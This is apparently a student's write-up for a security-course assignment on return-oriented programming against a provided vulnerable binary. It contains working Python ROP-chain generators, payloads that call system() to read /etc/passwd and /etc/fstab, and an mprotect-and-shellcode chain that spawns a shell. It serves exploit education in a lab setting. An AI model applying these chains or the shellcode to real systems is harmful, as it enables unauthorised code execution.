# PCS Assignment 6

### `sortraev` (wlc376)

_**This assignment was made in collaboration with Louis Normann**_ (`cqb868`).


## Part 1: Warmup


I use `gdb` to check values in registers before the segfault. I find out that
the program intends to call `system("/usr/games/lolcat -p 1 /etc/passwd")`, but
it fails because `lolcat` is misspelled as `lO1cat`.

---

## Part 2: Reverse-engineering

Please see the attached `rop-chain.txt`.

---

## Part 3: Fixing the mistake

We *could* simply fix the given `rop-chain`, since we would only need to change
two quadwords (to write `o` instead of `O`, and `l` instead of `1`). However, we
want to build the entire ROP chain from scratch.

To do so, I write a Python which, given an address `addr` and a string `s`;
builds a ROP chain which calls `memcpy` repeatedly to build the string in
memory. The function uses a pre-built dictionary which maps byte sequences to
addresses in the disassembly of the `assignment` binary where those byte
sequences can be found. This dictionary is then used to parse the string
left-to-right, using always the longest possible known byte sequence which is
also a prefix of the current string.

Below snippet (from `rop-chain-fix.py`) shows the implementation, however with most of
the `_map` dict omitted. See `common.py` for the helper functions used.

```python
def try_build_memcpys_chain(addr, s, do_shuffle = True):
    from collections import OrderedDict

    def longest_common_prefix_len(x, y):
        return np.cumprod([a == b for (a, b) in zip(x, y)]).sum()

    # a dict of various snippet/address mappings I found in the disassembly.
    _map = { b"/l": 0x400238, b"u": 0x4008a4, b"s": 0x400c6d, b"r": 0x4003fd,
             ...
           }
    # we want to sort the dictionaries in descending order of prefix length,
    # such that we always use the longest prefix available.
    _map = OrderedDict(sorted(_map.items(), key = lambda t: -len(t[0])))

    if isinstance(s, str) and s.isascii():
        s = bytes(s, encoding = "ascii")
    if not isinstance(s, bytes):
        raise ValueError(f"First arg should be ascii string or bytes")
    if not s.endswith(b"\x00"): s += b"\x00"

    chains = []
    cur_addr = addr

    while len(s) > 0:
        # find byte sequences which share a common prefix with current `s`.
        # _map is inverse sorted by len, so we get the longest prefixes first.
        tmp = [(addr, n) for (k, addr) in _map.items()
               if (n := longest_common_prefix_len(s, k)) > 0]
        if len(tmp) <= 0:
            raise ValueError(f"Failed to build memcpy chain for: {s}")

        src_addr, n_bytes = tmp[0]
        chains   += [memcpy_chain(cur_addr, src_addr, n_bytes)]
        cur_addr += n_bytes
        s = s[n_bytes:]

    if do_shuffle: random.shuffle(chains)
    return b"".join(chains)
```

Then, I use the function (along with a couple of other, less important helper
functions; please see `common.py`) to solve the task in `rop-chain-fix.py` as
such:

```python
def task_3():
    addr = 0x403160
    system_arg = "/usr/games/lolcat -p 1 /etc/passwd"

    # write the system() argument string to a known safe addr in mem
    rop = try_build_memcpys_chain(addr, system_arg)

    rop = do_align(rop) # align if necessary after the memcpy chain.

    # call system("usr/games/lolcat ..."), then exit(0).
    rop += call_libc_chain("getline", "system", rdi = addr)

    rop = do_align(rop) # align if necessary after call to system()

    rop += call_libc_chain("system",  "exit",   rdi = 0)

    # prepend stack garbage and append newline.
    rop = b"\0" * 131 + rop + b"\n"
    sys.stdout.buffer.write(rop)
```

---

## Part 4: Do something else

For task 3, I copied the structure and method used in the handed-out
`rop-chain`. However, it was not very efficient, since for one it required the
user to manually find byte sequences in the disassembly, and secondly, the
generated ROP chain quickly becomes very long, since you can often only write 1
or 2 bytes at a time depending on the contents of the binary.

Instead, we can use the `add [rsi], edi` gadget to always write 4 bytes at a
time using only 6 quadwords per write, where the `memcpy` method uses 9
quadwords and, as mentioned, typically only writes 1 or 2 bytes at a time,
meaning we save a lot of bytes in the initial stack overflow (as an example,
my best solution for task 3 cost 2300 bytes, whereas with this method, it costs
only 860).

This also has the advantage that we can write any byte sequences we want without
first finding them in the binary, since the write bytes are passed directly in
the ROP chain. We can even write strings containing newline bytes, by
decrementing each newline byte in the input string and adding ROP chains for
reconstructing the newlines at runtime, so we are truly only limited in the
amount of available space to write in.

However, note that since the gadget uses `add`, not `mov`, we do need to
zero-initialize the memory location before writing. Using the `memcpy` chain
from task 3 and the 28 zero-bytes located at address `0x4008e4`, we can
zero-initialize 28 bytes at a time before we start writing. There are other
locations in the binary with more consecutive null-bytes, but these are located
in writable memory so we cannot be sure they are zero at runtime (whereas
`0x4008e4` is in `.rodata`).

Below snippet (from `common.py`) shows the construction of the (almost)
arbitrary write chain (please see `common.py` for the helper functions used):

```python
def arbitrary_write_chain(addr, s, do_shuffle = True):
    if isinstance(s, str):
        s = bytes(s, encoding = "ascii")
    if not isinstance(s, bytes):
        raise ValueError("Second argument must be str or bytes!")
    if s == b"": return s

    # round up to nearest multiple of 4 then pad the string with null bytes.
    n = int(np.ceil((len(s) + (s[-1] != 0)) / 4) * 4)
    s += (n - len(s)) * b"\x00"

    # record addresses of newlines bytes in the original write string before
    # replacing all newlines with 0x9.
    nl_addrs = [addr + i for i, c in enumerate(s) if c == 0xa]
    s = bytes([c - int(c == 0xa) for c in s])

    ## first, we zero out the memory at `addr`, 28 bytes at a time, such
    ## that we can use the `add [rsi], edi` gadget to write bytes freely.
    ## the address 0x4008e4 points to 28 zero-bytes in read-only mem
    ZEROS = 0x4008e4
    zero_init_chain = b"".join(memcpy_chain(addr + i*28, ZEROS, 28)
                               for i in range(n // 28))
    if (rem := n % 28):
        zero_init_chain += memcpy_chain(addr + (n//28)*28, ZEROS, rem)


    ## next, we build the chain for the actual writing of bytes
    stride = range(0, n, 4)
    # split string in groups of 4, extending each group to 8 bytes.
    write_vals = [s[i:i+4] + 4 * b"\x00" for i in stride]

    # build a write chain using the `add [rsi], edi` gadget for each group of
    # 4 bytes in the input string
    write_chains = [add_rsi_edi_chain(addr + i, write_val)
                    for i, write_val in zip(stride, write_vals)]

    # reconstruct newline bytes by incrementing bytes at the recorded addresses
    nl_recon_chain = b"".join(add_rsi_edi_chain(addr, 1) for addr in nl_addrs)

    if do_shuffle:
        random.shuffle(write_chains)
    write_chain = b"".join(write_chains)

    return zero_init_chain + write_chain + nl_recon_chain
```

### Part 4.a -- reading `/etc/fstab`

I use the `arbitrary_write_chain()` function to solve the first half of part 4
as such (see `rop-chain-cat.py`, and, again, `common.py` for the helper
functions):

```python
def task_4a():
    addr = 0x403160
    system_arg = "PATH=/bin cat /etc/fstab"

    rop = arbitrary_write_chain(addr, system_arg)

    rop = do_align(rop) # align if necessary after the write chain.

    # call system("PATH=/bin ...") then exit(0).
    rop += call_libc_chain("getline", "system", rdi = addr)

    rop = do_align(rop) # align if necessary after call to system()

    rop += call_libc_chain("system", "exit", rdi = 0)

    # prepend stack garbage and append newline.
    rop = b"\0" * 131 + rop + b"\n"
    sys.stdout.buffer.write(rop)
```

### Part 4.b -- something cool

Unfortunately, I am not feeling very creative, so my "cool thing" is just going
to be a demonstration of how my `arbitrary_write_chain()` function.

I write a ROP-chain which:

1) uses `mprotect` to make the `.text` section writable;
2) uses my `arbitrary_write_chain()` to replace `main` with a piece of shellcode
     containing newline bytes; and
3) jumps to address of `main` and executes that shellcode.

The shellcode itself simply calls `execve(/bin/sh, ...)` and is not very
interesting, but can be viewed in `shellcode.asm`. What's important is that it
contains `0xa` bytes.

Below snippet (from `rop-chain-cool.py`) shows the construction of the ROP chain
(again, please see `common.py` for the other helper functions):

```python
def cool_stuff():
    # please see shellcode.asm.
    shellcode = b"jhH\xb8%bin///sH\x83\xc0\nPT_1\xf6\x99j1\x80\x04$\nX\x0f\x05"

    # make main writable
    page_start = 0x400000 # start of the page containing .text
    page_size  = 0x1000
    rop = call_libc_chain("getline", "mprotect",
                          rdi = page_start, rsi = 0x1000, rdx = 0b111)

    addr_main  = 0x400809
    rop += arbitrary_write_chain(addr_main, shellcode)
    rop += int2bytes(addr_main)

    rop = b"\x00" * 131 + rop + b"\n"
    sys.stdout.buffer.write(rop)
```

To run, please use:
```bash
$ ./rop-chain-cool.py > rop-chain-cool
$ cat rop-chain-cool - | LD_PRELOAD=./libc.so.6 ./assignment
```

So anyway, my cool stuff obviously isn't very flashy or fancy, but I hope it
demonstrates my knowledge of the binary and ROP chaining. <3

---
